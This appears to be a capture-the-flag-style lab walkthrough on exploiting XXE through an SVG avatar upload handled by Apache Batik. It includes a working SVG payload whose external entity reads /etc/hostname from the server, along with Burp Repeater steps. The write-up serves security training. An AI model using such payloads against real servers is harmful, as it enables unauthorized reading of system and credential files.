### Lab: Exploiting XXE via image file upload

This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing.  
Then use the "Submit solution" button to submit the value of the server hostname.

_____

Analysis and Exploit:

1. Intercept request for profile picture change and send it ot **[BRUP-REPEATER]**
    - csrf,
    - postId,
    - comment, 
    - name,
    - avatar,
    - email,
    - website (http://xxxxx)

2. Craft svg file with XML payload and upload it as avatar.svg

```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg> 
```
3. Upon successfull upload check the comment and open the avatar image, it should contains the hostname
